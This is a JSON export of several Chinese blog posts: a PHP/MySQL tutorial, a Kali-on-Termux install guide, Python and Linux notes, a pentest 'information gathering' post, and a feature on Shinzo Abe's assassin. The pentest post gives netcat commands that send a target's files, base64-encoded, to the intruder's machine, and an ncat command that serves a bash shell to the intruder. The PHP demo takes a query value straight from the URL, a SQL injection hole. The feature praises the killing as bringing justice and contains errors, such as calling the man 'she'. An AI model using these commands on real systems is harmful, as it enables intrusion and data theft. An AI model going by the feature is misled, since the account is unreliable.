\u0026#34;update db1 set pwd=\u0026#39;mima\u0026#39; where uid=\u0026#39;u2\u0026#39;\u0026#34;; if($conn-\u0026gt;query($sql)===true){ echo \u0026#34;修改成功\u0026#34; }else{ echo \u0026#34;修改失败\u0026#34;.$conn-\u0026gt;error; } $conn-\u0026gt;close();\t// 关闭数据库 ?\u0026gt; 特别的，这里使用的sql语句格式为:\n$sql = \u0026quot;update 数据表名 set 关键字1=值1 where 关键字2=值2\u0026quot;\n此处关键字1是实际修改内容，关键字2是用来定位要修改的条目\n操作：删 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php // 1. 配置连接 $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;root\u0026#34;; $dbname = \u0026#34;test\u0026#34;;\t//数据库库名 // 2. 创建链接（使用mysqli函数按格式填写所需参数） $conn = new mysqli($servername,$username,$password,$dbname); // 3. 检测连接 if($conn-\u0026gt;connect_error){ die(\u0026#34;连接失败\u0026#34;.$conn-\u0026gt;connect_error); } // 数据库删除语句============================================================== //准备一条数据库语句 $sql = \u0026#34;delete from db1 where uid=u4\u0026#34;; if($conn-\u0026gt;query($sql)===true){ echo \u0026#34;删除成功\u0026#34; }else{ echo \u0026#34;删除失败\u0026#34;.$conn-\u0026gt;error; } $conn-\u0026gt;close();\t// 关闭数据库 ?\u0026gt; 特别的，这里使用的sql语句格式为:\n$sql = \u0026quot;delete from 数据表名 where 关键字1=值1\u0026quot;\n问题排查 数据库连接相关错误（最基础也最常见） 连接参数配置错误 触发方式：修改 $servername / $username / $password / $dbname 中的任意值，与数据库实际配置不匹配。 例：把 $dbname = \u0026quot;test\u0026quot; 改成 $dbname = \u0026quot;test123\u0026quot; （数据库不存在）；把 $password = \u0026quot;root\u0026quot; 改成 $password = \u0026quot;123456\u0026quot; （密码错误）。\n问题表现：页面直接输出“连接失败”+ 具体错误信息（如 Unknown database \u0026rsquo;test123\u0026rsquo; 或 Access denied for user \u0026lsquo;root\u0026rsquo;@\u0026rsquo;localhost\u0026rsquo; (using password: YES) ）。\n问题根源：数据库连接的核心参数（地址、账号、密码、库名）必须与目标数据库完全一致，一旦 mismatch 就会连接失败。初学者常因“本地环境与服务器环境配置不同”“手误输错库名”踩坑。\n未设置字符编码导致中文乱码 触发方式：数据库表/字段包含中文字符，且代码中未添加字符集设置。\n问题表现：查询结果中的中文显示为 ??? 或乱码。\n问题根源：MySQL 数据库默认字符集可能为 latin1 ，而 PHP 页面通常用 UTF-8 ，两者编码不匹配导致中文无法正常解析。代码中缺少字符集设置语句，是初学者最容易忽略的点。\n如何触发：在数据库 db1 表的 job 字段中存入“程序员”“设计师”等中文字符，直接运行原代码，会发现中文乱码。\nSQL 执行相关错误（隐性且易导致后续逻辑崩溃） SQL 语法/表名/字段名错误，导致 query() 返回 false 触发方式：修改 SQL 语句中的关键字、表名或字段名，导致 SQL 语法无效。 例1：把select * from db1 where id \u0026lt; 4 改成 selec * from db1 where id \u0026lt; 4（ select 拼写错误）；\n例2：把 db1 改成 db1_not_exist （表不存在）；\n例3：把 id \u0026lt; 4 改成 id \u0026lt;（语法不完整）。\n问题表现：页面报错 Trying to get property \u0026rsquo;num_rows\u0026rsquo; of non-object （试图访问非对象的 num_rows 属性）。\n问题根源： $conn-\u0026gt;query($sql) 执行失败时（SQL 语法错、表/字段不存在等），会返回 false （而非结果集对象）。原代码直接用 $result-\u0026gt;num_rows ，相当于给 false 加 -\u0026gt; ，违反 PHP 语法（只有对象才能用 -\u0026gt; ）。\nSQL 注入漏洞（安全层面的严重错误） 触发方式：将 SQL 中的硬编码条件（如 id \u0026lt; 4 ）改为拼接用户输入的变量。 例：把 $sql = \u0026quot;select * from db1 where id \u0026lt; 4\u0026quot; 改成：\n1 2 $user_input = $_GET[\u0026#39;id\u0026#39;]; // 假设用户输入：4 or 1=1 $sql = \u0026#34;select * from db1 where id \u0026lt; $user_input\u0026#34;; 问题表现：恶意用户可通过输入 4 or 1=1 等语句，查询表中所有数据（甚至修改/删除数据），导致数据泄露。\n问题根源：原代码用“字符串拼接”方式构造 SQL（虽然当前是硬编码，无风险，但一旦接入用户输入就会触发注入），未使用 MySQLi 的预处理语句（参数化查询），无法过滤恶意输入。\n结果处理相关错误（逻辑疏忽导致） 字段名与代码访问名不匹配 触发方式：修改 $row['id'] / $row['uid'] / $row['job'] 中的字段名，或修改数据库表的字段名。 例：数据库表中字段名是 uid 而非 uid ，但代码中仍写 $row[\u0026lsquo;userid\u0026rsquo;] ；或把 $row[\u0026lsquo;job\u0026rsquo;] 改成 $row[\u0026lsquo;work\u0026rsquo;] 。\n问题表现：页面输出空值（ \u0026rsquo;\u0026rsquo; ）或报错 Undefined index: uid （未定义索引 uid ）。\n问题根源： fetch_assoc() 返回的关联数组，键名必须与数据库表的实际字段名完全一致（大小写敏感，取决于数据库配置），一旦拼写错误或字段名修改后未同步代码，就会出现索引不存在的错误。\n循环中变量覆盖或未处理空结果集的边界情况 触发方式：在循环外定义了同名变量 $row ，或修改 num_rows 的判断逻辑。 例：在 while 循环前添加 $row = [\u0026lsquo;id\u0026rsquo; =\u0026gt; 100]; ，会导致第一次循环覆盖初始值；或把 if($result-\u0026gt;num_rows\u0026gt;0) 改成 if($result-\u0026gt;num_rows) （看似等价，但如果 num_rows 为 0 时没问题，若 result 为 false 则报错，与前面 SQL 执行错误叠加）。\n问题表现：数据输出异常（首行数据错误）或报错（如前面提到的非对象访问）。\n问题根源：变量作用域未隔离（同名变量覆盖），或对 $result 的合法性判断不完整（只判断了行数，未判断 $result 是否为对象）。\nphp和html混写实现网页美化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;测试网页\u0026lt;/title\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php // 1. 配置连接 $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;root\u0026#34;; $dbname = \u0026#34;test\u0026#34;;\t//数据库库名 // 2. 创建链接（使用mysqli函数按格式填写所需参数） $conn = new mysqli($servername,$username,$password,$dbname); // 3. 检测连接 if($conn-\u0026gt;connect_error){ die(\u0026#34;连接失败\u0026#34;.$conn-\u0026gt;connect_error); } // 数据库查询语句 $userinput = $_GET[\u0026#39;num\u0026#39;]; //准备一条数据库语句 $sql = \u0026#34;select * from db1 where id \u0026lt;= $userinput\u0026#34;; // 这里相当于把查询指令赋值给$sql // 执行sql语句并返回给变量 $result = $conn-\u0026gt;query($sql); // 判断result里是否有东西 if($result-\u0026gt;num_rows\u0026gt;0){\t// $result-\u0026gt;num_rows获取结果集中的行数 // 输出数据==================================================================== echo \u0026#34;\u0026lt;table border=\u0026#39;1\u0026#39;\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;id\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;uid\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;job\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#34;; while($row = $result-\u0026gt;fetch_assoc()){\t// 每次从结果集中读取一行数据，并以关联数组形式返回 echo \u0026#34;\u0026lt;tr\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;td\u0026gt;\u0026#34;.$row[\u0026#39;id\u0026#39;].\u0026#34;\u0026lt;/td\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;td\u0026gt;\u0026#34;.$row[\u0026#39;uid\u0026#39;].\u0026#34;\u0026lt;/td\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;td\u0026gt;\u0026#34;.$row[\u0026#39;job\u0026#39;].\u0026#34;\u0026lt;/td\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/tr\u0026gt;\u0026#34;; } echo \u0026#34;\u0026lt;/table\u0026gt;\u0026#34;; }else{\t//======================================================================= echo \u0026#34;无结果\u0026#34;; } $conn-\u0026gt;close();\t// 关闭数据库 ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 分割线之间及代码头尾处有改动，分割线见主要实现了数据放置在表格中\n命令行连接数据库 打开C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\bin\n在此处启动CMD\n下面是一些常用命令：\nmysql -uroot -proot\t登录数据库\nshow databases;\t查看所有的库名\nuse xxx\t使用(定位)xxx这个库名\nshow tables;\t查看库中有什么表\nselect * from xxx\t查看xxx这张表里的所有数据\n此外所有php里的sql语句都可以在命令行之间使用\n","date":"2025-11-26T23:11:40+08:00","permalink":"https://www.retr0.xyz/p/1.4-php%E5%9F%BA%E7%A1%80%E7%94%A8%E6%88%B7%E4%BA%A4%E4%BA%92%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BA%A4%E4%BA%92/","title":"1.4 php基础：用户交互与数据库交互"},{"content":"获取termux 由Termux官网指引，我们可以从官方Github软件仓库下载最新版本，链接如下：\nGitHub - termux/termux-app: Termux - a terminal emulator application for Android OS extendible by variety of packages.\n安装相应版本即可\n安装Kali 打开termux（打开之后不要切换目录，在当前目录下执行以下命令） pkg update 更新依赖，类似于更新以安装的软件(依赖更新检查完成之后会有一个让你确认是否继续更新的操作，我们输入y就可以了） 1 pkg update pkg upgrade升极版本，这个相比较上个命令，更新的是系统版本 1 pkg upgrade 申请存储访问权限 termux-setup-storage（这个命令可以是我们能使用termux向手机写入数据） 1 termux-setup-storage 安装 pkg install wget（用来下载文件的命令） 1 pkg install wget (因为我已经安装过了，所以显示的是这个) 下载 安装脚本wget -O install-nethunter-termux https://offs.ec/2MceZWr （这个是用来安装kaili的脚本，这个是重点，因为系统的镜像是在这里下载的，我们需要耐心的等待下载完成） 1 wget -O install-nethunter-termux https://offs.ec/2MceZWr 然后就得到了这样一个文件\n给脚本执行权限chmod +x install-nethunter-termux （这样我们可以执行这个脚本\u0026rsquo;x\u0026rsquo;是执行权限） 1 chmod +x install-nethunter-termux 运行安装脚本 ./install-nethunter-termux 1 ./install-nethunter-termux 然后会出现一个kali的banner，等待下载完成（要有耐心，和一个流畅的网络，中途可能会下载失败，我们只需要重新开始就行了 因为wget 加上了O选项，所以会继续上次的下载位置，若是下载完成，但是不能安装系统，多半是系统安装包被命名其他的名字或者是下载的确是失败了）\n下载完成之后，执行 ./install-nethunter-termux,等待一阵之后，安装完成。\nnethunter（或者缩写nh） 开启 kalilinux命令行，注意开启的是普通权限的命令行\nnethunter -r 开启的是管理员的命令行\nnh kex\t打开vnc图形化界面（普通权限）首次使用需要配置密码（还会问你要不要设一个仅观看的vnc密码，自行选择是否启用）\nnh kex stop\t停止桌面服务\n使用VNC连接可视化界面 下载安装app：VNC Viewer ，下载地址：VNC-Viewer 蓝奏云\n在Termux中输入以下指令启动图形化界面：\n1 nh kex 这时会下面会输出地址和端口，一般为127.0.0.1:5901\n在VNC中填写地址和端口后设置画质为高画质后点击连接\n要求输入密码，填写你创建的密码即可\n问题解决：VNC服务停止，输出Process-completed-signal-9 简述 使用Termux安装Kali发行版，用RealVNC Viewer登入系统，没过几秒就会收到The connection closed unexpectedly的警告！\n接着回到Termux，看到终端机显示[Process completed (signal 9) - press Enter]的错误，原来是Termux的行程被Android系统中止了，但是手机RAM明明还够用啊？\n此问题源自于Android 12引入的新机制，下面简述原因，以及提供暂时的解决方法。\nTermux发生signal 9错误的原因：agnostic-apollo在Phantom, Cached And Empty Processes一文中详述了Android 12引进的新机制。Android系统将会监控APP所fork出来的子行程，并在达到32个以上子行程后将其终止，避免占用过多CPU资源。\n此一机制称为\u0026quot;Phantom Processes Killing\u0026quot;，因为开发者最害怕看到这种情况，得名影子行程杀手。\n在开发者要求下，Google于Android 12L以及Android 13以上版本加入了关闭Phantom Processes Killing的选项settings_enable_monitor_phantom_procs，然而使用者还是要手动使用ADB指令关闭。因此这是Google Android的问题，Temrux开发者尚未找到正式解决办法，下面指令停用的办法是agnostic-apollo提出的。\n以Termux来说，Phantom Processes Killing会导致Termux执行指令的时候被系统随机中止。Proot distro若要跑图形环境自然就会制造更多子行程了吧。尤其在切换到后台，要用VNC Viewer连线的时候，就会触发Phantom Processes Killing，不管手机RAM有多大。接著回到Termux便会看到[Process completed (signal 9) - press Enter]的错误讯息。\n解决Termux的signal 9错误执行指令将Phantom Processes Killing停用即可，虽然会导致某些APP的背景行程跟著不受控制。\n以下假定Android手机皆有安装Google Play服务框架，因为GMS会不定时覆写装置设定，所以要一并将其关闭。然而关闭GMS覆写可能会导致手机卡开机。\n如果手机没有Root权限 点击下载Windows版adb工具包并且解压缩。\n进入platform_tools目录，会看到ADB和Fastboot的执行档。在这里按SHIFT + 右键，开启终端机(或Powershell)。\n手机开启系统设定→关于手机，版本号码点5下，之后搜寻“开发人员选项”进去开启“ADB侦错”。\n将手机插上电脑，于Windows的终端机输入以下指令，在手机上同意侦错。\n1 adb devices\t检测设备 接著按照Android版本，执行以下指令：\nAndroid 12L和Android 13：\n1 /adb shell \u0026#34;settings put global settings_enable_monitor_phantom_procs false\u0026#34; Android 12：\n1 adb shell \u0026#34;/system/bin/device_config set_sync_disabled_for_tests persistent; /system/bin/device_config put activity_manager max_phantom_processes 2147483647\u0026#34; 执行reboot或手动重启，完成。\n如果手机有Root权限 开启Termux，切换到su，取得root权限\n1 su #取得root权限 按照Android版本执行指令。\nAndroid 12L和Android 13以上：\n1 su -c \u0026#34;settings put global settings_enable_monitor_phantom_procs false\u0026#34; Android 12：\n1 su -c \u0026#34;/system/bin/device_config set_sync_disabled_for_tests persistent; /system/bin/device_config put activity_manager max_phantom_processes 2147483647\u0026#34; 执行reboot或手动重启，完成。\n","date":"2025-11-25T23:23:58+08:00","image":"https://www.retr0.xyz/post/kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/termux.webp","permalink":"https://www.retr0.xyz/p/%E6%95%99%E7%A8%8B%E5%90%91%E5%9F%BA%E4%BA%8Etermux%E5%9C%A8%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E4%B8%8A%E5%AE%89%E8%A3%85kali/","title":"[教程向]基于Termux在安卓手机上安装Kali"},{"content":"本章共有三个练习，如下所示：\n练习一：2020年印美日新冠累计确诊人数 练习二：全国疫情地图可视化 练习三：动态GDP增长图 数据来源 练习数据全部来自《百度疫情实时大数据报告》，及公开的全球各国GDP数据\n使用的技术 Echarts 是个由百度开源的数据可视化,凭借着良好的交互性,精巧的图表设计,得到了众多开发者的认可。而 Python是门富有表达力的语言,很适合用于数据处理. 当数据分析遇上数据可视化时 pyecharts 诞生了。\n所以，现在安装pyecharts模块\n1 pip install pyecharts ","date":"2025-11-25T22:37:43+08:00","permalink":"https://www.retr0.xyz/p/10.1-%E7%BB%83%E4%B9%A0%E5%BA%8F/","title":"10.1 练习：序"},{"content":"信息搜集 本地信息搜集(Windows 命令) whoami\t查看自己身份\nwhoami /all\t获取当前域的信息\nipconfig\t获取ip地址信息\nipconfig /all\t获取详细的ip地址信息\n查询结果：[所在域-计算机名-账户名]\narp -a\t查询arp表\necho %PROCESSOR_ARCHITECTURE% 查看CPU架构\nsysteminfo\t查看操作系统信息\nwmic product\t查看安装的软件\nwmic product get name,version\t查看安装的软件和版本信息\nnet user\t查看本地用户\nnet session\t查看本地和远程的会话\nnet view\t查看内网的共享情况\nnet share\t查看自己共享了哪些东西\n远程信息搜集(Kali 命令) 什么样的服务器有入侵价值？\n有有价值的网站 seo.chinaz.com 查看seo信息，权重，ip访问量\n上面有庞大数据库的服务器 mssql mysql oracle redis\u0026hellip;\n性能优秀的服务器 高性能CPU，显卡，硬盘\n保有某些单位机密的服务器 nping --tcp -p 80 --flag syn 2 [目标ip]\n测试对方端口是否开放\nnc -nvz [目标ip] 1-65535\n使用nc查看对方端口是否开放\nnetdiscover -i [网卡名称] -r 192.168.x.0/24\n搜集内网用户的信息\narping [参数] [目标]\n使用arp扫描\n-i 指定网卡\n-c 发包数量\n-s 源mac\n-S 源ip\nnbtscan\n使用 netbios 协议进行信息搜集（Windows之间使用）\n通过计算机名解析对应ip\nwhatweb [网址]\n初步分析网站结构\nnc用法追加 文件传输（常规） 先启动发送 发送端：nc -l -p [端口号] \u0026lt;文件\n接收端：nc [发送端ip] [端口号] \u0026gt;文件\n先启动接收 接收端：nc -l -p [端口号] \u0026gt;文件\n发送端：nc [发送端ip] [端口号] \u0026lt;文件\n文本传输（加密） 目标机：\ncat [目标文件] | base64 | nc -nv [入侵机ip] [端口号] -q 1\n入侵机：\nnc -l -p [端口号] \u0026gt;文件\n文件传输（两台都是Linux且有一方没有nc） 目标机：\nwhois -h [入侵机ip] -p [端口号] cat [文件] | base64``\n入侵机：\nnc -l -v- p [端口号] | sed \u0026quot;s/ //g\u0026quot; | base64 -d\n加密通信（两台都是Linux） 使用ncat\n目标机：\nncat -c bash --all [入侵IP] -vnl [port] --ssl\n入侵机：\nncats -nv [目标IP] [port] --ssl\n","date":"2025-11-25T10:56:43+08:00","permalink":"https://www.retr0.xyz/p/1.3-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"1.3 信息搜集工具的使用"},{"content":"自定义Python包 什么是Python包 从物理上看，包就是一个文件夹，在该文件夹下包含了一个__init__.py文件，该文件夹可用于包含多个模块文件。\n从逻辑上看，包的本质依然是模块\n包的作用： 当我们的模块文件越来越多时，包可以帮助我们管理这些模块，包的作用就是包含多个模块，但包的本质依然是模块。\n包的创建 Quickstart：\n在Pycharm中右键新建Python软件包(Python Package)my_packages 自动生成__init__.py 新建包内模块：my_module1和my_module2 模块内代码如下 1 2 3 4 5 # my_module1模块中 print(1) def info_print1(): print(\u0026#39;my_module1\u0026#39;) 1 2 3 4 5 # my_module2模块中 print(2) def info_print2(): print(\u0026#39;my_module2\u0026#39;) 包的导入 方式一： 导入：import 包名.模块名\n调用：包名.模块名.目标\n方式二： 导入：from 包名 import 模块\n调用：模块名.目标\n补充：__main__变量的使用\n在__init__.py文件中写入__main__=[xxx,xxx]即可控制通过from xxx import *导入时的模块\n第三方包 在Python程序的生态中,有许多非常多的第三方包(非Python官方),可以极大的帮助我们提高开发效率,如\n· 科学计算中常用的:numpy包\n· 数据分析中常用的:pandas包\n· 大数据计算中常用的:pyspark、apache-flink包\n· 图形可视化常用的:matplotlib、pyecharts\n, 人工智能常用的:tensorflow\n· 等\n这些第三方的包,极大的丰富了Python的生态,提高了开发效率。\n但是由于是第三方,所以Python没有内置,所以我们需要安装它们才可以导入使用\n安装第三方包-pip 常规 按win+R后输入 cmd 回车或使用其他方法打开命令提示符。\n使用命令：pip install [包名称]\n网络优化 使用命令：\npip install -i https://pypi.tuna.tsinghua.edu.cn/simple [包名称]\n此处使用清华镜像源，也可以根据需要选择其镜像源\n1 2 3 4 5 6 以下是一些常用的国内镜像源地址，可根据需求选择： 清华大学: https://pypi.tuna.tsinghua.edu.cn/simple 阿里云: https://mirrors.aliyun.com/pypi/simple 中国科学技术大学: https://pypi.mirrors.ustc.edu.cn/simple 腾讯云: https://mirrors.cloud.tencent.com/pypi/simple 华为云: https://repo.huaweicloud.com/repository/pypi/simple ","date":"2025-11-24T21:59:02+08:00","permalink":"https://www.retr0.xyz/p/9.3-%E5%8C%85/","title":"9.3 包"},{"content":"【人物特写】山上彻野：她长得像妈妈却已不再是妈妈 【前传】 神权绞杀下的家破人亡 黄金时代的碎影 1980年的日本，昭和余晖尚未散尽，经济泡沫催生的繁荣仍笼罩着列岛。山上彻野降生在奈良一个精英家庭：外祖父是建筑公司老板兼拳击协会会长，家底殷实；父亲毕业于京都大学，是建筑界的青年才俊。彼时的家，是昭和梦的缩影——安稳、体面，满是对未来的期许。\n命运的裂痕在彻野4岁时骤然撕开。1984年，不堪工作重压与人际倾轧的父亲，以跳楼自杀的方式告别了这个世界。年轻的母亲一夜沦为寡妇，独自扛起抚养重病哥哥、懵懂彻野与襁褓中妹妹的重担。那一天，彻野眼中的阳光，一半随父亲沉入黑暗。\n邪教织就的地狱网 家庭的崩塌让母亲的精神防线彻底溃败。1991年，在一名教徒的诱骗下，她一头扎进了 「统一教」 （现世界和平统一家庭联合会）的怀抱。对她而言，这是亡夫“超度”、家庭“救赎”的唯一稻草；对三个孩子来说，这却是万劫不复的开始。\n为了所谓的“信仰虔诚”，母亲开始了疯狂的捐献。她变卖了外祖父留下的土地、房产，掏空了丈夫的人寿保险金，甚至不惜抵押仅剩的家当。最终，流向邪教的捐款总额超过一亿日元（约合人民币500万元），这个曾经富足的家庭，被神权榨干了最后一滴血。\n饥饿与死亡的双重绞杀 2002年，山上家宣告破产。彼时的彻野，天资聪颖，就读于奈良顶尖的郡山高校，梦想是成为消防员或宇航员，同学们都坚信他会考入名牌大学。但学费的空缺，硬生生掐断了他的求学路——他被迫转入技校，最终因家境困顿未能毕业，昭和青年的理想，碎在了现实的泥沼里。\n家里的日子早已沦为生存的挣扎。母亲沉迷教会活动，长期离家，孩子们常常饥肠辘辘。伯父心疼不已，送来的米和罐头，竟被母亲打包献给了邪教，留给孩子们的只有无尽的饥饿与寒冷。\n重病的哥哥自幼患小儿癌症，一只眼睛失明，生活无法自理。彻野曾是哥哥唯一的依靠，为了让哥哥和妹妹能拿到人寿保险金活下去，2005年服役于海上自卫队期间，他选择自杀殉职，却未遂。他拼尽全力想要守护的人，终究没能熬过绝望。2015年，哥哥在贫病交加与对母亲的彻底失望中自杀身亡。\n哥哥的死，抽干了彻野心中最后一丝温情。而身边唯一的慰藉，是同样在苦难中长大的妹妹。她目睹了哥哥的隐忍与付出，看懂了家庭的悲剧根源，从未有过半句怨言，反而默默支持着彻野——她打零工补贴家用，在他深夜崩溃时静静陪伴，成为他黑暗人生里唯一的光。这份支持，不是对暴力的默许，而是对苦难的共情，对邪教的憎恨，对哥哥的心疼。更藏着一份无人能懂的煎熬：她看着母亲的脸，却再也找不到半分母爱，“那不是妈妈，但长得像妈妈，怎么也无法放下”。\n【中传】 独狼的决绝与那声撕裂黑暗的枪响 复仇的靶心转移 哥哥死后，彻野的人生彻底坠入底层。他辗转于派遣公司，做着叉车司机等体力活，住在狭窄的廉租房里，家徒四壁，唯有一张旧桌子，承载着他无数个不眠之夜的恨意。他没有朋友，不与人交流，像一株在石缝中枯萎的野草，沉默地积蓄着力量。\n他的恨，早已指向了吞噬一切的统一教。他曾计划刺杀教团最高领导人韩鹤子（韩国人），带着刀具徘徊在教团活动场所，甚至准备投掷火焰瓶。但新冠疫情的爆发让韩鹤子无法访日，森严的安保也让这个目标变得遥不可及。\n这时，他看清了一个更残酷的现实：统一教能在日本横行无忌，根源在于与自民党的深度勾结——从岸信介开始，安倍家族便是教团的政治保护伞。于是，他将靶心转向了这个最有名的“支持者”——前首相安倍晋三。在他看来，唯有击倒这棵“大树”，才能让邪教的黑幕暴露在阳光之下。\n陋室中的凶器与孤勇 凭借海上自卫队学到的枪械知识，彻野在狭小的公寓里开始了武器制作。他在网上购买铁管、胶带、木板，用农业肥料自制火药，每一个步骤都带着决绝的冷静。为了测试威力，他深夜开着二手轻型车，驶入奈良深山试射，山林的寂静中，回荡着一个受害者的悲鸣。\n他一丝不苟地打磨着武器，从三管、五管到最后的双管霰弹枪，每一次改进，都凝聚着他对邪教的恨、对家庭的痛、对现实的绝望。邻居曾听到锯木头和金属撞击的声音，却无人过问——现代社会的冷漠，为这场悲剧埋下了最后的伏笔。\n（笔者注：后经警方测试凶器，发现该土制枪即便在极近距离下射击也很难准确打中目标，何不说山上把这辈子的幸运都用在了此刻）\n2022年7月8日：奈良的宿命时刻 那天，奈良的阳光格外刺眼。彻野得知安倍晋三将在大和西大寺站进行街头演说，他背着伪装成相机的自制土枪，混入了人群。监控录像里，他站在远处，眼神冰冷如铁，偶尔随着人群鼓掌，那掌声里没有丝毫温度，只有赴死的决绝。\n上午11时30分，安倍的演讲开始。彻野从背后悄然逼近，第一声枪响划破长空，安倍惊讶回头；第二声枪响，命运尘埃落定。\n他没有逃跑，被安保人员按倒在地时，表情漠然得像完成了一项使命。那一刻，两声枪响不仅击倒了一位前首相，更撕裂了日本战后的政治遮羞布，让邪教与权力勾结的黑幕，赤裸裸地暴露在全世界面前。\n【后传】 庭审内外的执念与悲歌 被告席上的冷静与坚守 被捕后的彻野，表现出了超乎常人的冷静。长达半年的精神鉴定认定他具有完全刑事责任能力，看守所里，他成了一个矛盾的“现象级人物”——无数同情他遭遇的民众寄送现金、衣物、漫画与点心，总额超百万日元。有人称他为“受害者”，有人骂他“恐怖分子”，而他只是将部分物品转赠福利机构，始终保持着沉默。\n面对律师，他从未否认自己的行为，却坚定地说：“如果不这样做，统一教的问题永远不会被社会正视。” 事实印证了他的话——日本政府随后展开了对统一教前所未有的清算，无数受害者家庭敢于站出来发声，邪教的扩张势头被遏制。他用自己的人生，换来了一场迟到的正义。\n母亲：被邪教掏空的躯壳 这场悲剧中，最令人唏嘘的仍是母亲。儿子犯下惊天大案后，她被警方秘密保护，外界期待她幡然醒悟，痛斥邪教。但现实却冰冷刺骨：她虽对社会动荡表示歉意，却始终拒绝批判统一教，甚至认为丈夫、长子的死，次子的行凶，都是因为自己“信仰不够虔诚”。\n庭审准备期间，她没有以母亲的身份痛哭求情，反而向媒体表示，要为儿子的行为向教会“深刻道歉”，并宣称“今后仍会继续捐款”。这个曾经的家庭主妇，早已被邪教抽干了人性与母爱，只剩下一具刻着“信徒”标签的躯壳。\n妹妹：黑暗中唯一的守望者 彻野最牵挂的妹妹，成了这场悲剧的另一个受害者。她不得不辞掉工作，隐姓埋名，搬离熟悉的城市，却始终没有与哥哥割裂。面对最后检方询问她与被告之间的关系时，她毫不犹豫的说：\n「山上是我最喜欢的哥哥」\n「私とって兄は 大好(daisuki)きな兄ちゃんでした」\n她记得哥哥为了养活自己，辍学打工的艰辛；记得哥哥为了保护她，挡在母亲与邪教徒面前的背影；记得哥哥在哥哥自杀后，抱着她痛哭的夜晚。而对母亲，她始终挣脱不开那份复杂的执念：“她已经不是母亲了，她只是统一教的疯狂的信徒，但是她长了一张妈妈的脸，我不能甩开她，也不能抛弃她。” 这份“放不下”，是最苦情的牵绊，是邪教留给她最沉重的创伤——她既恨母亲的执迷不悟，又心疼那张承载着童年记忆的脸，在爱恨交织中独自煎熬。这份支持，是彻野黑暗人生里唯一的暖意，也是这场悲壮故事中，最令人心碎的温柔。她用自己的方式守护着哥哥的名誉，也守护着这个破碎家庭最后的尊严。\n未落的法槌与未尽的悲歌 截至2025年11月，对山上彻野的审判仍在“公判前整理程序”中缓慢推进。案件的复杂性、证据链的庞大，再加上法院收到的危险品邮包，让庭审多次延期。检方追求死刑，认为他破坏了民主制度；辩护律师主张减刑，强调他“情有可原的动机”与“悲剧性的成长环境”。\n日本社会在等待这场审判，却早已超越了对一个人的定罪——这是对邪教罪恶的审判，是对权力勾结的审判，是对社会冷漠的审判。\n如今，彻野被关押在大阪拘留所，每天读书、沉思，等待着最终的判决。无论结果是死刑还是无期徒刑，那个梦想成为宇航员的少年，早已在1984年父亲跳楼的那一刻死去；那个想要守护家人的青年，也在哥哥自杀的夜晚耗尽了生机。\n【尾声】 奈良的枪声早已消散，但它留下的追问，却久久回荡：当邪教与权力勾结，当法律与规则无法庇护受害者，当最亲的人只剩熟悉的躯壳，当“放不下”成为最沉重的枷锁，一个普通人的抗争，究竟该何去何从？而那些被邪教摧毁的家庭，那些在“像妈妈却不是妈妈”的执念中煎熬的灵魂，又该如何得到救赎？\n","date":"2025-11-23T22:35:58+08:00","image":"https://www.retr0.xyz/post/%E9%9A%8F%E7%AC%94/img/1-1.webp","permalink":"https://www.retr0.xyz/p/%E4%BA%BA%E7%89%A9%E7%89%B9%E5%86%99%E5%B1%B1%E4%B8%8A%E5%BD%BB%E9%87%8E%E5%A5%B9%E9%95%BF%E5%BE%97%E5%83%8F%E5%A6%88%E5%A6%88%E5%8D%B4%E5%B7%B2%E4%B8%8D%E5%86%8D%E6%98%AF%E5%A6%88%E5%A6%88/","title":"【人物特写】山上彻野：她长得像妈妈却已不再是妈妈"},{"content":"知识和指令 基础知识 文件属性 示例：d r-x(A) r-x(B) r-x(C) 13 root(D) root(E) 0 Nov 3 11:22 1.txt\n括号部分仅作讲解用，实际上不存在\nA=所有者权限\nB=所有者所在的组的权限\nC=其他人权限\nD=文件的所有人\nE=D所在的组\n类型：\nd文件夹\n-文件\nl链接\n权限：\nr=read=4 w=write=2 x=execute=1\n权限编号的计算使用加法，例如：\n权限代码 编号 r-x 5 -rw 6 \u0026ndash;r 4 修改文件权限：\nchmod [权限编号] [目标文件]\t修改文件权限\nchmod [权限编号] -R [文件夹]\t把文件夹和文件内所有东西都赋值为75\n示例：chmod 755 1.txt\n系统操作 防火墙 chkconfig iptables on/off\t打开/关闭防火墙\napt命令 软件安装apt-get install xxx\n基础指令： 系统指令： 系统相关 passwd\t修改当前用户密码\nifconfig\t查看ip\nwhoami\t查看自己是谁（账户）\nclear\t清空当前终端\nuname\t查看操作系统\nuname -a\t查看详细版本号\n文件相关 ls\t查看当前目录所有文件和文件夹\nls -la\t查看详细信息（文件属性）\nmkdir\t创建目录\ncd\t转到指定目录\ntouch\t创建文件\ncat\t查看文件\nchmod\t修改文件权限\ncp [被复制的文件] [复制到（包括文件名）]\t复制文件\nmv [被剪切的文件] [粘贴到（包括文件名）]\t剪切文件（也可用于修改文件名）\nrm [目标]\t删除\nrm -rf [目标]\t全部强制删除\nfind [要砸那个地方查找] -name [查找的文件名]\t查找文件\necho 